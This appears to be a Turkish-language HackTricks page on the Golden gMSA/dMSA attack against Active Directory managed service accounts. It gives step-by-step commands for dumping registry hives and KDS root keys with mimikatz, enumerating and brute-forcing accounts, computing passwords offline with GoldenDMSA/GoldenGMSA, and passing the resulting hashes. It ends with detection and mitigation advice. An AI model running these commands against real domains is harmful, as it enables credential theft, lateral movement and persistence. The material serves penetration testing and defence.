# Golden gMSA/dMSA Attack (Managed Service Account Passwordlarının Offline Türetilmesi)

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Windows Managed Service Account'lar (MSA), parolalarını manuel olarak yönetme ihtiyacı olmadan service çalıştırmak için tasarlanmış özel principal'lardır.
İki ana çeşidi vardır:

1. **gMSA** – group Managed Service Account – `msDS-GroupMSAMembership` attribute'unda yetkilendirilmiş birden fazla host üzerinde kullanılabilir.
2. **dMSA** – delegated Managed Service Account – aynı cryptography'ye dayanan ve daha ayrıntılı delegation senaryolarına olanak tanıyan, gMSA'nın (preview) halefidir.

Her iki varyantta da **parola**, normal bir NT-hash gibi her Domain Controller (DC) üzerinde **saklanmaz**. Bunun yerine her DC mevcut parolayı anlık olarak şu girdilerden **türetebilir**:

* Forest genelindeki **KDS Root Key** (`KRBTGT\KDS`) – her DC'ye `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` container'ı altında replicate edilen, rastgele oluşturulmuş GUID-adlandırılmış secret.
* Hedef account **SID**'si.
* `msDS-ManagedPasswordId` attribute'unda bulunan, account'a özel **ManagedPasswordID** (GUID).

Türetme işlemi: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → son olarak **base64-encoded** hâle getirilen ve `msDS-ManagedPassword` attribute'unda saklanan 240 byte'lık blob.
Normal parola kullanımı sırasında herhangi bir Kerberos trafiği veya domain interaction gerekmez – bir member host, üç girdiyi bildiği sürece parolayı local olarak türetebilir.

## Golden gMSA / Golden dMSA Attack

Bir attacker üç girdinin tamamını **offline** olarak elde edebilirse, DC'ye tekrar dokunmadan forest'taki **herhangi bir gMSA/dMSA için geçerli mevcut ve gelecekteki parolaları** hesaplayabilir ve şunları bypass edebilir:<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* Password change intervals (önceden hesaplayabilirler)

Bu, service account'lar için bir *Golden Ticket* benzeridir.<sup>[[1]](#references)[[2]](#references)</sup>

### Ön Koşullar

1. **Bir DC'nin forest-level compromise'ı** (veya Enterprise Admin) ya da forest'taki DC'lerden birine `SYSTEM` erişimi.
2. Service account'ları enumerate etme yeteneği (LDAP read / RID brute-force).
3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) veya eşdeğer code'u çalıştırmak için .NET ≥ 4.7.2 x64 workstation.

### Golden gMSA / dMSA
#### Phase 1 – KDS Root Key'i Extract Etme

Herhangi bir DC'den dump alın (Volume Shadow Copy / raw SAM+SECURITY hives veya remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
`RootKey` (GUID adı) olarak etiketlenen base64 dizesi sonraki adımlarda gereklidir.<sup>[[1]](#references)[[2]](#references)</sup>

##### Aşama 2 – gMSA / dMSA nesnelerini enumerate etme

En azından `sAMAccountName`, `objectSid` ve `msDS-ManagedPasswordId` bilgilerini alın:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA), yardımcı modları uygular:<sup>[[1]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Aşama 3 – ManagedPasswordID değerini Tahmin Etme / Keşfetme (eksik olduğunda)

Bazı deployment'lar, ACL-protected read işlemlerinde `msDS-ManagedPasswordId` değerini *strip* eder.
GUID 128-bit olduğundan naive bruteforce uygulanabilir değildir, ancak:

1. İlk **32 bit = hesabın oluşturulma Unix epoch time değeri**dir (dakika çözünürlüğü).
2. Bunu 96 rastgele bit takip eder.

Bu nedenle **her hesap için dar bir wordlist** (± birkaç saat) gerçekçidir.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Araç, aday parolaları hesaplar ve bunların base64 blob'unu gerçek `msDS-ManagedPassword` özniteliğiyle karşılaştırır; eşleşme, doğru GUID'yi ortaya çıkarır.

##### Aşama 4 – Offline Password Computation & Conversion

ManagedPasswordID bilindiğinde, geçerli parola tek komutla elde edilir:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
The resulting hashes, **mimikatz** (`sekurlsa::pth`) veya Kerberos abuse için **Rubeus** ile enjekte edilebilir; bu da gizli **lateral movement** ve **persistence** sağlar.

## Detection & Mitigation

* **DC backup ve registry hive read** yeteneklerini Tier-0 yöneticileriyle sınırlandırın.
* DC'lerde **Directory Services Restore Mode (DSRM)** veya **Volume Shadow Copy** oluşturulmasını izleyin.
* `CN=Master Root Keys,…` okumalarını/değişikliklerini ve service accounts hesaplarının `userAccountControl` flag'lerini denetleyin.
* Olağandışı **base64 password writes** veya host'lar arasında service password'lerinin aniden yeniden kullanılmasını tespit edin.
* Tier-0 isolation mümkün olmadığında, yüksek ayrıcalıklı gMSA'leri düzenli ve rastgele rotation uygulanan **classic service accounts** hesaplarına dönüştürmeyi değerlendirin.

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – bu sayfada kullanılan reference implementation.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – bu sayfada kullanılan reference implementation.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – türetilmiş AES key'lerini kullanarak pass-the-ticket.

## References

- [1] [Golden dMSA – delegated Managed Service Accounts için authentication bypass](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
